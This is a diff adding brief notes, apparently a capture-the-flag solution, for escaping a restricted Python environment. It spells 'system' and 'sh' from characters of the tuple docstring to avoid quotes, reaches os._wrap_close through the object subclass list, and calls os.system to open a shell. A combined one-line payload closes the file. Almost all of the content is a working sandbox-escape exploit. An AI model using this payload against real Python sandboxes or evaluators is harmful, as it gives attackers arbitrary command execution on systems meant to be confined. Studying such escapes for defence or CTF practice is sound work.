@@ -1,0 +1,19 @@
+## 1. Get the letters from ().__doc__ (as we can't use single quote, we can use variables to build the word 'system' and 'sh')
+s:=().__doc__[19]
+y:=().__doc__[86]
+t:=().__doc__[4]
+e:=().__doc__[17]
+m:=().__doc__[10]
+h:=().__doc__[56]
+
+### Note: ().__doc__
+### Built-in immutable sequence...If no argument is given, the constructor returns an empty tuple.\nIf iterable is specified the tuple is initialized from iterable's items.\n\nIf the argument is a tuple, the return value is the same object.
+
+## 3. Get "<class 'os._wrap_close'>"
+().__class__.__base__.__subclasses__()[155]
+
+## 4. Then just ".__init__.__globals__["system"]("sh")"
+().__class__.__base__.__subclasses__()[155].__init__.__globals__[s+y+s+t+e+m](s+h)
+
+# Final payload
+(s:=().__doc__[19],y:=().__doc__[86],t:=().__doc__[4],e:=().__doc__[17],m:=().__doc__[10],h:=().__doc__[56],().__class__.__base__.__subclasses__()[155].__init__.__globals__[s+y+s+t+e+m](s+h))
